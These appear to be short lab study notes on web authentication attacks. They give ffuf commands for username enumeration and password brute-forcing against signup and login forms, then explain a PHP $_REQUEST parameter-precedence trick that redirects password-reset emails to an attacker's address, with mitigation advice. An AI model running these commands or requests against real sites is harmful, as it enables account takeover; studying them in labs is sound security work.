brute force using ffuf tool

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://<target>/customers/signup -mr "username already exists"


if username is known then -

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.166.225/customers/login -fc 200


authentication bypass - 

password reset link send email
1. What is a key in query strings and POST data?

    A key is the name of a parameter in the query string or POST data.
    Example:
        Query string: ?email=user@example.com
            Key: email
            Value: user@example.com
        POST data:

        email=attacker@example.com

            Key: email
            Value: attacker@example.com

2. How the same key can exist in both?

The same key can exist in two different sources (query string and POST data) when the application processes both types of data simultaneously:
Example:

    Query string URL provided to the application:

https://example.com/reset_password.php?email=user@example.com

    Here, the key is email and the value is user@example.com.

Attacker submits a POST request to the same URL with different data:

    POST /reset_password.php?email=user@example.com HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    email=attacker@example.com

    In this case:
        Query string key: email=user@example.com
        POST key: email=attacker@example.com

Both use the same key: email, but have different values.

3. Why does PHP prefer POST data?

In PHP, when both GET (query string) and POST data are combined into $_REQUEST, POST data takes priority. This is a built-in behavior.

    $_REQUEST['email'] will return the POST value (attacker@example.com) instead of the query string value (user@example.com).

4. Impact of Same Key Issue

In a poorly implemented application:

    The application might expect to use the query string value for the email (user@example.com).
    However, since $_REQUEST prefers POST data, the application ends up using the POST value (attacker@example.com) instead.
    This allows the attacker to manipulate sensitive behavior, such as sending a password reset email to their email address.

5. How to Avoid This Issue?

    Avoid using $_REQUEST. Instead, use $_GET explicitly for query string data and $_POST for form submissions.
    Validate and sanitize all user inputs. For example:
        If the email is supposed to come from the query string, ensure you're using $_GET['email'].
        Cross-check the email value with the user account in the database to confirm authenticity.
